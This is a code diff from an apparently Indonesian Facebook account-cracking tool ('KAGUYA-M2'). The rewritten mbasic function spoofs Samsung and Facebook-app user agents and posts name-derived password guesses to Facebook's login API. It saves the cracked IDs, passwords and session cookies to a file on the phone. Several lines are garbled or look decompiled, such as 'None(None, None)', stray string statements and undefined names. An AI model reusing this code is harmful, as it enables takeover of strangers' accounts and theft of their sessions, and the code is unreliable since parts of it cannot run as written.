@@ -1329,7 +1329,7 @@ def metslow():
                 else:
                     pass
                 if "validatev1" in method:
-                    pool.submit(mbasic,idf,pwv)
+                    pool.submit(mbasic,idf,nmf,pwv)
                 #elif "validatev2" in method:
                     #pool.submit(validatev2,idf,pwv)
                 #elif "reguler" in method:
@@ -1337,7 +1337,7 @@ def metslow():
                 #elif "mbasic" in method:
                     #pool.submit(mbasic,idf,pwv)
                 else:
-                    pool.submit(mbasic,idf,pwv)
+                    pool.submit(mbasic,idf,nmf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1396,7 +1396,7 @@ def metcepat():
                         pwv.append(xpwd)
                 else:pass
                 if "validatev1" in method:
-                    pool.submit(mbasic,idf,pwv)
+                    pool.submit(mbasic,idf,nmf,pwv)
                 #elif "validatev2" in method:
                     #pool.submit(validatev2,idf,pwv)
                 #elif "reguler" in method:
@@ -1404,7 +1404,7 @@ def metcepat():
                 #elif "mbasic" in method:
                     #pool.submit(mbasic,idf,pwv)
                 else:
-                    pool.submit(mbasic,idf,pwv)
+                    pool.submit(mbasic,idf,nmf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1421,7 +1421,112 @@ def metcepat():
 
 
 #----------[ METHOD API ]----------#
-def mbasic(idf,pwv):
+def mbasic(idf, name, pwv):
+	global loop
+	mcc = random.choice([
+            'SM-F711B',
+            'SM-F711N',
+            'SM-F711U',
+            'SM-F711U1',
+            'SM-E025F',
+            'SM-T575',
+            'SM-A516V',
+            'SM-M017F',
+            'SM-J260GU',
+            'SM-J260GU',
+            'SM-J260FU',
+            'SM-J260MU',
+            'SM-A716F',
+            'SM-A716F',
+            'SM-A716F',
+            'SM-A7160',
+            'SM-A716B',
+            'SM-A716U',
+            'SM-A716B',
+            'SM-M115F',
+            'SM-M115F',
+            'SM-M115M',
+            'SM-M115M',
+            'SM-G988',
+            'SM-G988U',
+            'SM-G988U1',
+            'SM-G9880',
+            'SM-G988B',
+            'SM-G988N',
+            'SM-G988B',
+            'SM-T927A',
+            'SM-T920',
+            'SM-A305F',
+            'SM-A305FN',
+            'SM-A305G',
+            'SM-A305GN',
+            'SM-A305YN',
+            'SM-A3050',
+            'SM-A305N',
+            'SM-A305GT',
+            'SM-A105F',
+            'SM-A105G',
+            'SM-A105M',
+            'SM-A105FN',
+            'SM-A920F',
+            'SM-A9200',
+            'SM-A920N',
+            'SM-A920X',
+            'SM-N960F',
+            'SM-N9600',
+            'SM-N960F',
+            'SM-N960U',
+            'SM-N960U1',
+            'SM-N960N',
+            'SM-N960W',
+            'SM-N960X',
+            'SCV40'])
+	uai = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + str(random.randint(40, 200)) + '.0.0.' + str(random.randint(1, 66)) + '.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/' + str(random.randint(111111111, 666666666)) + ';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/' + str(mcc) + ';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+	cn = random.randint(60, 99)
+	sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;32mKAGUYA-M2\x1b[1;31m] \x1b[1;36m{loop}\x1b[1;35m \x1b[1;34m|\x1b[1;32m OK\x1b[1;34m|\x1b[1;31mCP \x1b[1;32m{len(oks)}\x1b[1;34m|\x1b[1;31m{len(cps)} \x1b[1;34m| \x1b[1;36m{'{:.0%}'.format(loop / float(len(self.id)))}{S}''')
+	sys.stdout.flush()
+	fs = name.split(' ')[0]
+	ls = name.split(' ')[1]
+	ls = fs
+	for ps in pwv:
+		ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
+		session = requests.Session()
+		data = {
+			'method': 'auth.login',
+			'fb_api_req_friendly_name': 'authenticate',
+			'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+			'api_key': '882a8490361da98702bf97a021ddc14d' }
+		None(None, None)
+		if not 'GB':
+			pass
+		'client_country_code'
+		'en_GB'
+		'locale'
+		headers = {
+			'Content-Length': f'''6{cn}''' }
+		q = session.post('https://b-graph.facebook.com/auth/login', data = data, headers = headers, allow_redirects = False).json()
+		if 'session_key' in q:
+			ckkk = ";".join(i["name"]+"="+i["value"] for i in q()["session_cookies"])
+			KAGUYAb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
+			cookie = f'''sb={KAGUYAb};{ckkk}'''
+			print(f'''\r\r\x1b[1;31m[\x1b[1;32mKAGUYA-OK\x1b[1;31m]\x1b[1;32m {idf} | {ps} ''')
+			print(f'''\r\r\x1b[1;31m[\x1b[1;32mCOOKIES\x1b[1;31m]{O}{cookie} ''')
+			open('/sdcard/KAGUYA-M2-FILE-OK.txt', 'a').write(idf + '|' + ps + '|' + cookie + '\n')
+			oks.append(idf)
+			';'.join
+		if 'www.facebook.com' in q['error']['message']:
+			print(f'''\r\r{M}[KAGUYA-CP] {idf} | {ps} ''')
+			open('/sdcard/KAGUYA-M2-FILE-OK.txt', 'a').write(idf + '|' + ps + '\n')
+			cps.append(idf)
+		loop += 1
+		return None
+		if requests.exceptions.ConnectionError:
+			'Keep-Alive'
+			mbasic(idf, mame, pwv)
+			return None
+
+
+def mbasiccjd(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(baru)
